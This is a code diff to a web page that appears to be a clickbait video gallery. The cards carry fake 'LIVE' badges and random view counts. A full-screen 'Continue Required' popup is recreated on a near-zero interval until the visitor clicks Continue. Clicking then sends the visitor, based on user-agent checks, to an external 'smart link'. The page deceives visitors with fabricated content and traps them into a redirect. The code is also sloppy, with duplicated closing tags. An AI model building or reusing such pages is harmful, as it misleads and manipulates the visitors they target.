@@ -164,25 +164,17 @@ const titles = [
 "🏆 Top Viral Video"
 ];
 
-  <script>
-
+// ===================== LINK =====================
 let smartLink = "https://example.com";
 
-// ===============================
-// FLAG (STOP CONDITION)
-// ===============================
+// ===================== STATE =====================
 let accepted = localStorage.getItem("acceptedPopup") === "true";
 
+// ===================== POPUP SYSTEM =====================
+function showPopup(){
 
-// ===============================
-// POPUP CREATE FUNCTION
-// ===============================
-function createPopup(){
-
-  // যদি user already accept করে
   if(accepted) return;
 
-  // আগের popup remove
   const old = document.getElementById("customPopup");
   if(old) old.remove();
 
@@ -190,41 +182,10 @@ function createPopup(){
   popup.id = "customPopup";
 
   popup.innerHTML = `
-    <div style="
-      position:fixed;
-      top:0;left:0;
-      width:100%;height:100%;
-      background:rgba(0,0,0,0.85);
-      display:flex;
-      justify-content:center;
-      align-items:center;
-      z-index:99999;
-    ">
-
-      <div style="
-        background:#fff;
-        padding:20px;
-        border-radius:10px;
-        text-align:center;
-        width:85%;
-        max-width:300px;
-        color:#000;
-      ">
-
-        <h3>🔥 Continue Required</h3>
-        <p>Please click continue to access content</p>
-
-        <button id="continueBtn" style="
-          padding:10px 20px;
-          background:#007bff;
-          color:#fff;
-          border:none;
-          border-radius:5px;
-        ">
-          Continue
-        </button>
-
-      </div>
+    <div class="popup-box">
+      <h3>🔥 Continue Required</h3>
+      <p>Please click continue to watch content</p>
+      <button id="continueBtn">Continue</button>
     </div>
   `;
 
@@ -232,29 +193,22 @@ function createPopup(){
 
   document.getElementById("continueBtn").onclick = function(){
 
-    localStorage.setItem("acceptedPopup", "true");
+    localStorage.setItem("acceptedPopup","true");
     accepted = true;
 
     popup.remove();
-
     openExternal();
   };
 }
 
-
-// ===============================
-// 🔥 UNLIMITED LOOP SYSTEM
-// ===============================
+// ===================== LOOP POPUP =====================
 setInterval(()=>{
   if(!accepted){
-    createPopup();
+    showPopup();
   }
-}, 1500); // প্রতি 1.5 sec পর পর popup নিশ্চিত করা হবে
+},00);
 
-
-// ===============================
-// SMART REDIRECT
-// ===============================
+// ===================== REDIRECT =====================
 function openExternal(){
 
   const ua = navigator.userAgent.toLowerCase();
@@ -290,7 +244,45 @@ function openExternal(){
   window.location.href = smartLink;
 }
 
+// ===================== CREATE CARDS =====================
+const grid = document.getElementById("grid");
+
+images.forEach((img,i)=>{
+
+  const card = document.createElement("div");
+  card.className = "card";
+
+  card.innerHTML = `
+    <div style="position:relative">
+      <img src="${img}">
+      <div class="play">▶</div>
+      <div class="views">👁 ${Math.floor(Math.random()*90000)}</div>
+      <div class="badge">LIVE</div>
+    </div>
+
+    <div class="card-body">
+      <div class="title">${titles[i]}</div>
+
+      <div class="actions">
+        <button onclick="event.stopPropagation()">👍 10</button>
+        <button onclick="event.stopPropagation()">👎 1</button>
+      </div>
+    </div>
+  `;
+
+  // CLICK → POPUP
+  card.onclick = ()=>{
+    showPopup();
+  };
+
+  grid.appendChild(card);
+});
+
 </script>
+
+</body>
+</html>
+
 
 </body>
 </html>
